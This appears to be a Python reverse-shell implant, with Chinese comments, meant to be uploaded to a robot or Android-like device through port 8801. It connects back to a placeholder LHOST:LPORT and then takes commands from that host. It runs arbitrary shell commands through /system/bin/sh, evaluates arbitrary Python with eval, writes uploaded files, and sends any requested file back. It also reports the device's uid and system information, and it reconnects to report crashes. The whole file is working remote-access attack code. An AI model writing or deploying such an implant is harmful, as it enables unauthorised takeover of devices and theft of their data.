# sig_runner.py — 机器人侧 Python 命令执行器（经 8801 上传运行）
# 反连 LHOST:LPORT。协议：收一行命令，回 "OUT:<len>\n<bytes>"。
#   ping     → 环境信息（不碰 subprocess）
#   py:expr  → eval 并回传 repr
#   其他     → /system/bin/sh -c 执行
import os
import socket
import sys
import time
import traceback

LHOST = "__LHOST__"
LPORT = __LPORT__
RUNID = "%x" % int(time.time() * 1000 % 0xFFFFFFFF)


def reply(s, data):
    s.sendall(b"OUT:" + str(len(data)).encode() + b"\n" + data)


def main():
    s = socket.create_connection((LHOST, LPORT), timeout=30)
    s.settimeout(None)          # create_connection 的超时会留在 socket 上，必须清掉
    f = s.makefile("rb")
    s.sendall(b"READY:" + RUNID.encode() + b":%f\n" % time.time())
    while True:
        line = f.readline()
        if not line:
            break
        reply(s, b"GOT[" + RUNID.encode() + b"]:" + line.rstrip(b"\n"))
        cmd = line.decode("utf-8", "replace").rstrip("\n")
        if cmd == "exit":
            break
        try:
            if cmd == "ping":
                out = ("py=%s uid=%s gid=%s cwd=%s uname=%s" % (
                    sys.version.split()[0],
                    os.getuid() if hasattr(os, "getuid") else "?",
                    os.getgid() if hasattr(os, "getgid") else "?",
                    os.getcwd(), " ".join(os.uname()))) .encode()
            elif cmd.startswith("put:"):
                # put:<path>:<n> 随后紧跟 n 字节原始内容 → 写文件
                _, path, ns = cmd.split(":", 2)
                n = int(ns)
                data = b""
                while len(data) < n:
                    chunk = f.read(n - len(data))
                    if not chunk:
                        break
                    data += chunk
                fp = open(path, "wb")
                fp.write(data)
                fp.close()
                out = ("WROTE %d -> %s" % (len(data), path)).encode()
            elif cmd.startswith("get:"):
                # get:<path> → 把文件原始字节作为 OUT 帧载荷回传（二进制安全）
                fp = open(cmd[4:], "rb")
                out = fp.read()
                fp.close()
            elif cmd.startswith("py:"):
                out = repr(eval(cmd[3:])).encode()
            else:
                import subprocess
                p = subprocess.Popen(["/system/bin/sh", "-c", cmd],
                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                out = p.communicate()[0]
        except Exception:
            out = ("ERR:\n" + traceback.format_exc()).encode()
        reply(s, out)
    s.close()


try:
    main()
except Exception:
    try:
        s2 = socket.create_connection((LHOST, LPORT), timeout=10)
        reply(s2, ("FATAL:\n" + traceback.format_exc()).encode())
        s2.close()
    except Exception:
        pass
